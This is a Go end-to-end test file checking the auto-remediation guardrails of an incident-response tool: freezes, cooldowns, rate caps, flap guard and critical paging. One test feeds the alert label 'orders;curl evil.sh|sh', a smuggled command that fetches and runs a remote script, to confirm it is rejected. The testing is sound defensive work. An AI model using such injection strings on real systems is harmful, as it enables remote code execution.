package e2e

// Auto-remediation guardrails (alert-incident-model.md §8, runbook-schema.md
// §3.5). Every test runs the real agent against the simulated ECS, on a
// dedicated "orders" service fed by a signed generic webhook, so it controls
// the alert's severity and labels and the service's hold, verification and
// reopen windows.
//
// When a guardrail blocks auto-remediation, no run may start, on-call is paged
// at once (principle 5: default to paging when unsure), and the timeline and
// the page both say why.

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/peacedouts/nightfix/internal/controlplane"
	"github.com/peacedouts/nightfix/internal/db"
)

const ordersSvc = "orders"

// autoRunbook is an auto-triggered runbook for the orders service. Zero
// fields get the defaults noted.
type autoRunbook struct {
	Name           string
	Selector       string // agentSelector env (default prod, which the test agent has)
	BeforePaging   bool
	Cooldown       string // default 1s
	MaxRunsPerHour int    // default 10
	Steps          string // default quickFix
}

// quickFix forces a new deployment and finishes at once.
const quickFix = `    - id: restart
      type: aws
      service: ecs
      action: UpdateService
      input:
        cluster: ${{ params.cluster }}
        service: ${{ params.service }}
        forceNewDeployment: true
`

// slowFix also waits (up to 2m) for the service to stabilize; with
// stub.SetHeals(false) it is still running when the test ends.
const slowFix = quickFix + `    - id: wait-stable
      type: wait
      interval: 1s
      timeout: 2m
      check:
        aws:
          service: ecs
          action: DescribeServices
          input:
            cluster: ${{ params.cluster }}
            services: ["${{ params.service }}"]
      until: result.services[0].runningCount == result.services[0].desiredCount
`

func (r autoRunbook) yaml() string {
	if r.Selector == "" {
		r.Selector = "prod"
	}
	if r.Cooldown == "" {
		r.Cooldown = "1s"
	}
	if r.MaxRunsPerHour == 0 {
		r.MaxRunsPerHour = 10
	}
	if r.Steps == "" {
		r.Steps = quickFix
	}
	return fmt.Sprintf(`apiVersion: nightfix.dev/v1alpha1
kind: Runbook
metadata:
  name: %s
  title: Restart orders tasks
spec:
  parameters:
    cluster:
      type: string
      required: true
      from: alert.labels.cluster
      pattern: "^[A-Za-z0-9_-]{1,255}$"
    service:
      type: string
      required: true
      from: alert.labels.service
      pattern: "^[A-Za-z0-9_-]{1,255}$"
  target:
    agentSelector:
      env: %s
  triggers:
    - type: alert
      services: [orders]
      match: 'alert.labels.alertname == "tasks-unhealthy"'
      mode: auto
      beforePaging: %t
      cooldown: %s
      maxRunsPerHour: %d
  policy:
    timeout: 15m
  steps:
%s  onFailure:
    action: escalate
`, r.Name, r.Selector, r.BeforePaging, r.Cooldown, r.MaxRunsPerHour, r.Steps)
}

type guard struct {
	*env
	ingest, secret string
}

// setupGuard is the walking-skeleton env plus the orders service (created
// with svc's settings) and the given runbooks.
func setupGuard(t *testing.T, svc map[string]any, runbooks ...autoRunbook) *guard {
	t.Helper()
	e := setup(t, runbookYAML(t, "2m"))
	if svc == nil {
		svc = map[string]any{}
	}
	svc["name"] = ordersSvc
	e.call("POST", "/v1/services", svc, nil)
	e.call("POST", "/v1/services/orders/escalation-targets", map[string]any{"type": "slack", "url": e.stubURL + "/slack"}, nil)
	e.call("POST", "/v1/services/orders/escalation-targets",
		map[string]any{"type": "pagerduty", "routing_key": "pd-orders", "events_url": e.stubURL + "/pagerduty"}, nil)
	var integ map[string]string
	e.call("POST", "/v1/integrations", map[string]any{"type": "webhook", "name": "orders alerts", "default_service": ordersSvc}, &integ)
	e.stub.AddService("prod-east", ordersSvc)
	for _, rb := range runbooks {
		e.callRaw("PUT", "/v1/runbooks/"+rb.Name, []byte(rb.yaml()), nil)
	}
	return &guard{env: e, ingest: integ["ingest_url"], secret: integ["signing_secret"]}
}

// fire sends a firing "tasks-unhealthy" alert for the given ECS service;
// key is its dedup key (one key, one alert).
func (g *guard) fire(key, severity, service string) {
	g.t.Helper()
	g.send(map[string]any{"dedup_key": key, "severity": severity, "summary": "orders tasks unhealthy",
		"labels": map[string]string{"alertname": "tasks-unhealthy", "cluster": "prod-east", "service": service}})
}

func (g *guard) clear(key string) {
	g.t.Helper()
	g.send(map[string]any{"dedup_key": key, "status": "resolved", "summary": "orders tasks healthy"})
}

func (g *guard) send(body map[string]any) {
	g.t.Helper()
	b, _ := json.Marshal(body)
	req, _ := http.NewRequest("POST", g.ingest, bytes.NewReader(b))
	req.Header.Set(controlplane.WebhookSignatureHeader, controlplane.SignWebhook(g.secret, b, time.Now()))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		g.t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusAccepted {
		g.t.Fatalf("ingest returned %d", resp.StatusCode)
	}
}

type runInfo struct {
	Runbook, Status string
	Verified        sql.NullBool
	Incident        sql.NullInt64
}

// runs lists every run for the orders runbooks, oldest first.
func (g *guard) runs() []runInfo {
	g.t.Helper()
	var out []runInfo
	err := g.db.WithOrg(g.ctx, g.rawOrg, func(tx *db.Tx) error {
		rows, err := tx.Query(`SELECT r.runbook_name, r.status, r.verified, i.number FROM runbook_runs r
			LEFT JOIN incidents i ON i.id = r.incident_id WHERE r.runbook_name LIKE 'orders-%' ORDER BY r.started_at`)
		if err != nil {
			return err
		}
		defer rows.Close()
		for rows.Next() {
			var r runInfo
			if err := rows.Scan(&r.Runbook, &r.Status, &r.Verified, &r.Incident); err != nil {
				return err
			}
			out = append(out, r)
		}
		return rows.Err()
	})
	if err != nil {
		g.t.Fatal(err)
	}
	return out
}

// runsFor returns the runs started for incident n.
func (g *guard) runsFor(n int) []runInfo {
	var out []runInfo
	for _, r := range g.runs() {
		if r.Incident.Valid && r.Incident.Int64 == int64(n) {
			out = append(out, r)
		}
	}
	return out
}

// pages returns what PagerDuty received for incident n, by event action.
func (g *guard) pages(n int) (triggers []string, resolves int) {
	inc := g.incident(n)
	if inc == nil {
		return nil, 0
	}
	_, _, pd := g.stub.Snapshot()
	for _, ev := range pd {
		if ev["dedup_key"] != inc["id"] {
			continue
		}
		switch ev["event_action"] {
		case "trigger":
			details, _ := ev["payload"].(map[string]any)["custom_details"].(map[string]any)
			triggers = append(triggers, fmt.Sprint(details["reason"]))
		case "resolve":
			resolves++
		}
	}
	return triggers, resolves
}

// timelineHas reports whether incident n's timeline has an entry of type typ
// whose message contains msg.
func (g *guard) timelineHas(n int, typ, msg string) bool {
	if g.incident(n) == nil {
		return false
	}
	for _, l := range g.timeline(n) {
		if strings.HasPrefix(l, typ+": ") && strings.Contains(l, msg) {
			return true
		}
	}
	return false
}

func (g *guard) waitUntil(what string, n int, cond func() bool) {
	g.t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	g.dump(n)
	g.t.Fatalf("timed out waiting for %s", what)
}

func (g *guard) dump(n int) {
	if g.incident(n) == nil {
		g.t.Logf("incident #%d does not exist", n)
		return
	}
	g.t.Logf("incident #%d is %s; timeline:", n, status(g.incident(n)))
	for _, l := range g.timeline(n) {
		g.t.Log("  " + l)
	}
	g.t.Logf("runs: %+v", g.runs())
}

func (g *guard) waitStatus(n int, want string) {
	g.t.Helper()
	g.waitUntil(fmt.Sprintf("incident #%d %s", n, want), n, func() bool {
		inc := g.incident(n)
		return inc != nil && status(inc) == want
	})
}

// waitPaged waits until incident n paged for a reason containing reason:
// in its timeline and as a PagerDuty trigger carrying that reason.
func (g *guard) waitPaged(n int, reason string) {
	g.t.Helper()
	g.waitUntil(fmt.Sprintf("incident #%d to page with %q", n, reason), n, func() bool {
		triggers, _ := g.pages(n)
		for _, r := range triggers {
			if strings.Contains(r, reason) {
				return g.timelineHas(n, "incident.paged", reason)
			}
		}
		return false
	})
}

func (g *guard) waitRunStatus(n int, want string) {
	g.t.Helper()
	g.waitUntil(fmt.Sprintf("incident #%d's run to be %s", n, want), n, func() bool {
		runs := g.runsFor(n)
		return len(runs) > 0 && runs[len(runs)-1].Status == want
	})
}

// assertBlocked checks the outcome every blocking guardrail must have:
// incident n paged with reason, is triggered, and started no run.
func (g *guard) assertBlocked(n int, reason string) {
	g.t.Helper()
	g.waitPaged(n, reason)
	if st := status(g.incident(n)); st != "triggered" {
		g.t.Fatalf("incident #%d is %s; want triggered", n, st)
	}
	if runs := g.runsFor(n); len(runs) != 0 {
		g.t.Fatalf("a blocked guardrail still started runs: %+v", runs)
	}
	if g.timelineHas(n, "remediation.started", "") || g.timelineHas(n, "run.started", "") {
		g.t.Fatalf("timeline shows a remediation starting: %v", g.timeline(n))
	}
}

// autoRemediate takes incident n, opened by alert key, through a verified
// auto-remediation: the held run succeeds, the alert clears, nobody is paged.
func (g *guard) autoRemediate(n int, key string) {
	g.t.Helper()
	g.waitRunStatus(n, "succeeded")
	g.clear(key)
	g.waitUntil(fmt.Sprintf("incident #%d auto-remediated", n), n, func() bool {
		inc := g.incident(n)
		return status(inc) == "resolved" && inc["resolution"] == "auto_remediated"
	})
	if triggers, _ := g.pages(n); len(triggers) != 0 {
		g.t.Fatalf("auto-remediated incident #%d paged: %v", n, triggers)
	}
}

func held(name string) autoRunbook { return autoRunbook{Name: name, BeforePaging: true} }

// ---------------------------------------------------------------------------
// Hold conditions (§8.3): page immediately instead of remediating.
// ---------------------------------------------------------------------------

func TestGuardrailOrgFrozenPagesWithoutRunning(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart"))
	g.call("POST", "/v1/org/freeze", map[string]any{}, nil)
	g.fire("A", "high", ordersSvc)
	g.assertBlocked(1, "the org is frozen (kill switch)")
}

func TestGuardrailUnresolvableParamsPageWithoutRunning(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart"))
	g.fire("A", "high", "orders;curl evil.sh|sh") // labels are attacker-influenceable
	g.assertBlocked(1, "parameters could not be resolved from the alert")
	if !g.timelineHas(1, "incident.paged", "does not match") {
		t.Fatalf("timeline should name the failed pattern: %v", g.timeline(1))
	}
	if calls, _, _ := g.stub.Snapshot(); countCalls(calls, "ecs:UpdateService") != 0 {
		t.Fatalf("ECS was called: %v", calls)
	}
}

func TestGuardrailNoHealthyAgentPagesWithoutRunning(t *testing.T) {
	rb := held("orders-restart")
	rb.Selector = "staging" // the only agent is env=prod
	g := setupGuard(t, nil, rb)
	g.fire("A", "high", ordersSvc)
	g.assertBlocked(1, "no healthy agent matches the runbook's target")
}

func TestGuardrailCooldownForIdenticalParams(t *testing.T) {
	rb := held("orders-restart")
	rb.Cooldown = "1h"
	g := setupGuard(t, nil, rb)
	g.fire("A", "high", ordersSvc)
	g.autoRemediate(1, "A")

	// A different alert on the same ECS service resolves to the same
	// parameters, inside the cooldown.
	g.fire("B", "high", ordersSvc)
	g.assertBlocked(2, "cooldown: it already ran for these parameters")
	if runs := g.runs(); len(runs) != 1 {
		t.Fatalf("got %d runs; want only the first", len(runs))
	}
}

func TestGuardrailMaxRunsPerHour(t *testing.T) {
	rb := held("orders-restart")
	rb.MaxRunsPerHour = 1
	g := setupGuard(t, nil, rb)
	g.fire("A", "high", ordersSvc)
	g.autoRemediate(1, "A")

	// Different parameters, so the cooldown doesn't apply; the hourly cap does.
	g.fire("B", "high", "orders-canary")
	g.assertBlocked(2, "rate limit: maxRunsPerHour (1) reached")
	if runs := g.runs(); len(runs) != 1 {
		t.Fatalf("got %d runs; want only the first", len(runs))
	}
}

// Three verified fixes of one alert in 24h mean the real problem isn't being
// fixed: the fourth firing pages instead of remediating again.
func TestGuardrailFlapGuard(t *testing.T) {
	// A short reopen window, so each re-fire opens a new incident (a re-fire
	// inside it reopens and pages without retrying, which isn't this guard).
	g := setupGuard(t, map[string]any{"reopen_window": "1s"}, held("orders-restart"))
	for n := 1; n <= controlplane.FlapGuardThreshold; n++ {
		g.fire("flappy", "high", ordersSvc)
		g.autoRemediate(n, "flappy")
		time.Sleep(1500 * time.Millisecond) // past the reopen window and the 1s cooldown
	}
	for _, r := range g.runs() {
		if !r.Verified.Bool {
			t.Fatalf("run %+v should be verified", r)
		}
	}
	g.fire("flappy", "high", ordersSvc)
	g.assertBlocked(4, "flap guard: this alert was auto-remediated 3 times in 24h")
}

// v1 never picks between competing auto-fixes: ambiguity pages a human at
// once instead of holding the page.
func TestGuardrailSeveralHeldRunbooksPageImmediately(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart-a"), held("orders-restart-b"))
	g.fire("A", "high", ordersSvc)
	g.assertBlocked(1, "More than one auto-remediation runbook matched (orders-restart-a, orders-restart-b)")
}

// ---------------------------------------------------------------------------
// Critical incidents page in parallel with remediation (§8.6).
// ---------------------------------------------------------------------------

func TestGuardrailCriticalIncidentPagesWhileRemediationRuns(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart"))
	g.fire("A", "critical", ordersSvc)
	g.waitPaged(1, "critical incidents page in parallel")
	if st := status(g.incident(1)); st != "triggered" {
		t.Fatalf("critical incident is %s; it pages rather than holding (want triggered)", st)
	}
	// The remediation still runs...
	g.waitRunStatus(1, "succeeded")
	// ...and when the alert clears the upstream page resolves by itself.
	g.clear("A")
	g.waitStatus(1, "resolved")
	g.waitUntil("upstream page resolved", 1, func() bool { _, r := g.pages(1); return r == 1 })
	if triggers, _ := g.pages(1); len(triggers) != 1 {
		t.Fatalf("paged %d times; want once: %v", len(triggers), triggers)
	}
}

func TestGuardrailSeverityRaisedToCriticalDuringHoldPages(t *testing.T) {
	cases := map[string]func(g *guard){
		"the same alert re-fires as critical": func(g *guard) { g.fire("A", "critical", ordersSvc) },
		"a critical alert joins the incident": func(g *guard) { g.fire("B", "critical", ordersSvc) },
	}
	for name, raise := range cases {
		t.Run(name, func(t *testing.T) {
			rb := held("orders-restart")
			rb.Steps = slowFix
			g := setupGuard(t, nil, rb)
			g.stub.SetHeals(false) // the run keeps going for the whole test
			g.fire("A", "high", ordersSvc)
			g.waitStatus(1, "remediating")
			g.waitRunStatus(1, "running")
			if triggers, _ := g.pages(1); len(triggers) != 0 {
				t.Fatalf("a held, non-critical remediation paged: %v", triggers)
			}

			raise(g)
			g.waitPaged(1, "Severity rose to critical")
			if st := status(g.incident(1)); st != "triggered" {
				t.Fatalf("incident is %s after paging; want triggered", st)
			}
			if runs := g.runsFor(1); len(runs) != 1 || runs[0].Status != "running" {
				t.Fatalf("paging must not stop the remediation: %+v", runs)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// The hold ends (§8.1, §8.2).
// ---------------------------------------------------------------------------

func TestGuardrailRunSucceedsButAlertKeepsFiringPages(t *testing.T) {
	g := setupGuard(t, map[string]any{"verification_window": "3s"}, held("orders-restart"))
	g.fire("A", "high", ordersSvc)
	g.waitRunStatus(1, "succeeded")
	g.waitUntil("verification to start", 1, func() bool { return g.timelineHas(1, "remediation.verifying", "") })
	if triggers, _ := g.pages(1); len(triggers) != 0 {
		t.Fatalf("paged before the verification window ended: %v", triggers)
	}
	if st := status(g.incident(1)); st != "remediating" {
		t.Fatalf("incident is %s during verification; want remediating", st)
	}

	// The alert never clears.
	g.waitPaged(1, "Remediation ran but the alert is still firing after the verification window")
	if st := status(g.incident(1)); st != "triggered" {
		t.Fatalf("incident is %s; want triggered", st)
	}
	if runs := g.runsFor(1); runs[0].Verified.Bool {
		t.Fatalf("a fix that didn't clear the alert was marked verified: %+v", runs[0])
	}
}

func TestGuardrailHoldExpiryPagesWhileRunContinues(t *testing.T) {
	rb := held("orders-restart")
	rb.Steps = slowFix
	g := setupGuard(t, map[string]any{"max_hold": "4s"}, rb)
	g.stub.SetHeals(false)
	g.fire("A", "high", ordersSvc)
	g.waitStatus(1, "remediating")
	if !g.timelineHas(1, "remediation.started", "paging held for up to 4s") {
		t.Fatalf("the hold should be capped at the service's max_hold: %v", g.timeline(1))
	}
	if triggers, _ := g.pages(1); len(triggers) != 0 {
		t.Fatalf("paged during the hold: %v", triggers)
	}

	g.waitPaged(1, "The paging hold expired before remediation finished; the run continues")
	if st := status(g.incident(1)); st != "triggered" {
		t.Fatalf("incident is %s; want triggered", st)
	}
	if runs := g.runsFor(1); len(runs) != 1 || runs[0].Status != "running" {
		t.Fatalf("the run should continue after the hold expires: %+v", runs)
	}
}

// A fix that "works" for a few minutes isn't a fix: a re-fire inside the
// reopen window reopens the incident and pages, and the same runbook is not
// retried for it (§8.1 step 5).
func TestGuardrailReopenAfterAutoFixPagesWithoutRetry(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart"))
	g.fire("A", "high", ordersSvc)
	g.autoRemediate(1, "A")
	g.fire("A", "high", ordersSvc)
	g.waitPaged(1, "the earlier fix didn't hold")
	if st := status(g.incident(1)); st != "triggered" {
		t.Fatalf("reopened incident is %s; want triggered", st)
	}
	if runs := g.runs(); len(runs) != 1 {
		t.Fatalf("auto-remediation was retried for the reopened incident: %+v", runs)
	}
}

// ---------------------------------------------------------------------------
// Gaps found while writing the tests above (fixed).
// ---------------------------------------------------------------------------

// A critical alert is auto-remediated in parallel with its page. When the
// run succeeds and the alert clears, that is a verified auto-fix like any
// other (§8.6: "Runs of any severity count"), so a critical alert that keeps
// coming back must trip the flap guard too.
func TestGuardrailFlapGuardCountsCriticalAutoFixes(t *testing.T) {
	g := setupGuard(t, map[string]any{"reopen_window": "1s"}, held("orders-restart"))
	for n := 1; n <= controlplane.FlapGuardThreshold; n++ {
		g.fire("flappy", "critical", ordersSvc)
		g.waitRunStatus(n, "succeeded")
		g.clear("flappy")
		g.waitStatus(n, "resolved")
		if runs := g.runsFor(n); !runs[0].Verified.Bool {
			g.dump(n)
			t.Fatalf("incident #%d: the run succeeded and the alert cleared, but the run isn't verified", n)
		}
		time.Sleep(1500 * time.Millisecond)
	}
	g.fire("flappy", "critical", ordersSvc)
	g.waitPaged(4, "flap guard")
	if runs := g.runsFor(4); len(runs) != 0 {
		t.Fatalf("flap guard didn't stop the fourth run: %+v", runs)
	}
}

// An auto runbook without beforePaging runs alongside the page. When a
// guardrail stops it, the page must not tell on-call that it is running.
func TestGuardrailBlockedParallelRunbookIsNotReportedAsRunning(t *testing.T) {
	g := setupGuard(t, nil, autoRunbook{Name: "orders-restart"})
	g.call("POST", "/v1/org/freeze", map[string]any{}, nil)
	g.fire("A", "high", ordersSvc)
	g.waitUntil("a page", 1, func() bool { triggers, _ := g.pages(1); return len(triggers) > 0 })
	if !g.timelineHas(1, "remediation.skipped", "the org is frozen") {
		t.Fatalf("timeline should record why the runbook didn't start: %v", g.timeline(1))
	}
	if runs := g.runsFor(1); len(runs) != 0 {
		t.Fatalf("a frozen org started runs: %+v", runs)
	}
	triggers, _ := g.pages(1)
	if strings.Contains(triggers[0], "runs alongside paging") {
		t.Fatalf("the page claims a blocked runbook is running: %q", triggers[0])
	}
}

// "Verified" means the alerts resolved and stayed resolved through the reopen
// window (§8.6, §11). A fix whose alert re-fires inside that window must not
// count as verified: verified runs feed the flap guard and the critical-hold
// track record.
func TestGuardrailReopenedFixIsNotCountedAsVerified(t *testing.T) {
	g := setupGuard(t, nil, held("orders-restart"))
	g.fire("A", "high", ordersSvc)
	g.autoRemediate(1, "A")
	g.fire("A", "high", ordersSvc)
	g.waitPaged(1, "the earlier fix didn't hold")
	if runs := g.runs(); runs[0].Verified.Bool {
		t.Fatalf("the run of a fix that didn't hold is still verified: %+v", runs[0])
	}
}
